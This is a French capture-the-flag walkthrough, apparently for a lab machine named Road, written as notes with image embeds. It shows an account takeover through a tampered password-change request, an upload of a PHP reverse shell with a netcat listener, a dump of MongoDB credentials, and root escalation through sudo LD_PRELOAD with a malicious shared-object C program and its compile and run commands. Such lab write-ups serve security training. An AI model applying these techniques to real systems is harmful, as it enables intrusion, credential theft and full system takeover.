
- **IP**:

```
10.48.190.225
```

On va commencer par un scan **nmap**

![[Road/filr/nmap.png]]

Explorons le port 80. On a trouver une page où on peut créer un compte:

![[Road/filr/web.png]]

On va donc créer un compte et on va se connecter à ce compte:

![[dashboard_usertest.png]]

Dans le profil de l'utilisateur, on a trouver l'email de l'admin:

![[email_admin.png]]

On va utiliser BurpSuite pour essayer de se connecter via le compte **admin**. Nous allons d'abord essayer de changer le mdp de l'utilisateur et intercepter la requête:

![[change_pass.png]]

On va envoyer cette requête au **Repeater** et changer l'username par l'email de l'admin:

![[chnge_uname_to_admin.png]]

Maintenant on peut se connecter avec le compte admin

![[sign_as_admin.png]]

Une fois connecter, on peut uploader un fichier image pour le profil. Mais le backend ne vérifie pas si le fichier uploadé est vraiment une image ou autre chose, on peut donc uploader un fichier php malveillant pour obtenir un shell. En inspectant le code-source de la page profil, nous avons trouver un url où les fichier uploadé sont stockés:

![[url_upload_images.png]]

On va donc uploader le fichier php malveillant  que vous pouvez retrouver ici: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 Mettre un serveur en écoute avec `nc -nvlp 4444` et aller sur l'url:
```
http://10.48.190.225/v2/profileimages/php-reverse-shell.php
```

Et voilà, on a un shell:

![[Road/filr/shell.png]]

Pour trouver  l'user flag, on entre la commande:

```
find / -name "user.txt" 2>dev/null
```

![[Road/filr/user_flag.png]]

Pour élever notre privilège, on d'abord lister les ports en écoute:

```
ss -tulnp
```

![[tulnp.png]]

Après analyse, on constate que le port **27017** qui est le port par défaut de **MongoDB** est en écoute. On peut exécuter la commande `mongo` pour accéder à **MongoDb**.

On va commencer par lister les bdd: `show dbs`

![[liste_bdd.png]]
 Puis aller vers **backup**: `use backup`  lister les tables: `show collections`
  
![[table_backup.png]]

Voir le contenu de la table **user**: `db.user.find()`

![[liste-user.png]]
Là on trouver un username et mdp donc on peut faire un ssh:

![[ssh_webdevelopper.png]]

Pour voir les binaires qu'on peut exécuter avec **sudo**, on tape la commande `sudo -l`

![[Road/filr/sudoL.png]]

LD_PRELOAD est une fonction qui permet à tout programme d'utiliser des bibliothèques partagées. Les étapes de cette méthode d'élévation de privilèges peuvent être résumées comme suit :

1. Vérifier la présence de LD_PRELOAD (avec l'option env_keep)
2. Écrire un programme C simple, compilé en tant que fichier objet partagé (extension .so)
3. Exécuter le programme avec les droits sudo et l'option LD_PRELOAD pointant vers notre fichier .so

On va créer un fichier .c:

```
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>void _init() {  
 unsetenv("LD_PRELOAD");  
 setgid(0);  
 setuid(0);  
 system("/bin/bash");  
}
```

Puis:

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```
sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
```

![[Road/filr/root_flag.png]]